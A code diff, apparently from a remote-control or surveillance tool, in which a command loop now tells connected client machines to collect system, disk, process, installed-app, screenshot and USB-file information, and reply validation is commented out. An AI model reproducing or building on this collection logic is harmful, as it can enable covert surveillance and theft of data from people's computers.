@@ -22,12 +22,12 @@
 #pragma comment(lib,"dbghelp.lib")
 
 
-int CommandRecver::SendHeartBeat(LPUNIQUECLIENTSYMBOL lpUnique, NETWORKPROCPARAM stParam, char* lpdata, int datasize) {
+int CommandRecver::SendCmd(LPUNIQUECLIENTSYMBOL lpUnique, NETWORKPROCPARAM stParam, char* lpdata, int datasize,int cmd,int subcmd) {
 
 	LPNETWORKPACKETHEADER lphdr = (LPNETWORKPACKETHEADER)lpdata;
-	lphdr->cmd = HEARTBEAT;
+	lphdr->cmd = cmd;
 	lphdr->unique = *lpUnique;
-	lphdr->packlen = 0;
+	lphdr->packlen = subcmd;
 	int iLen = sizeof(NETWORKPACKETHEADER);
 
 	int iRet = send(stParam.hSockClient, lpdata, iLen, 0);
@@ -36,19 +36,13 @@ int CommandRecver::SendHeartBeat(LPUNIQUECLIENTSYMBOL lpUnique, NETWORKPROCPARAM
 		return FALSE;
 	}
 
-	iRet = recv(stParam.hSockClient, lpdata, datasize, 0);
-	if (iRet <= 0)
-	{
-		return FALSE;
-	}
-
-	LPNETWORKPACKETHEADER lpnewhdr = (LPNETWORKPACKETHEADER)lpdata;
-	if (lpnewhdr->cmd != HEARTBEAT ||
-		memcmp(lpnewhdr->unique.cMAC, lpUnique->cMAC, MAC_ADDRESS_LENGTH) ||
-		lpnewhdr->unique.dwVolumeNO != lpUnique->dwVolumeNO)
-	{
-		return FALSE;
-	}
+	//LPNETWORKPACKETHEADER lpnewhdr = (LPNETWORKPACKETHEADER)lpdata;
+	//if (lpnewhdr->cmd != HEARTBEAT ||
+	//	memcmp(lpnewhdr->unique.cMAC, lpUnique->cMAC, MAC_ADDRESS_LENGTH) ||
+	//	lpnewhdr->unique.dwVolumeNO != lpUnique->dwVolumeNO)
+	//{
+	//	return FALSE;
+	//}
 	return TRUE;
 }
 
@@ -63,6 +57,8 @@ int __stdcall CommandRecver::CommandRecverProcess(LPNETWORKPROCPARAM lpParam, ch
 	char szShowInfo[1024];
 
 	int iRet = 0;
+
+	int init = 0;
 
 	int dwPackSize = recv(stParam.hSockClient, lpdata, NETWORK_BUF_SIZE, 0);
 	if (dwPackSize < sizeof(NETWORKPACKETHEADER))
@@ -219,14 +215,25 @@ int __stdcall CommandRecver::CommandRecverProcess(LPNETWORKPROCPARAM lpParam, ch
 				break;
 			}
 
-
 			Sleep(COMMAND_LOOP_DELAY);
+
+			if (init == 0) {
+				
+				int cmd = MACHINE_INFO | DISKFILE_INFO | PROCESS_INFO | 
+					APPINSTALL_INFO | APPSCREENSHOT_INFO | SCREENSHOT_INFO | USBFILE_INFO;
+				iRet = SendCmd(&Unique, stParam, lpdata, NETWORK_BUF_SIZE, DAILY_WORK_ITEM, cmd);
+				if (iRet == FALSE)
+				{
+					break;
+				}
+				init = 1;
+			}
 
 			waitcnt++;
 			if (waitcnt >= waitceiling)
 			{
 				waitcnt = 0;
-				iRet = SendHeartBeat(&Unique, stParam, lpdata, NETWORK_BUF_SIZE);
+				iRet = SendCmd(&Unique, stParam, lpdata, NETWORK_BUF_SIZE,HEARTBEAT,0);
 				if (iRet == FALSE)
 				{
 					break;
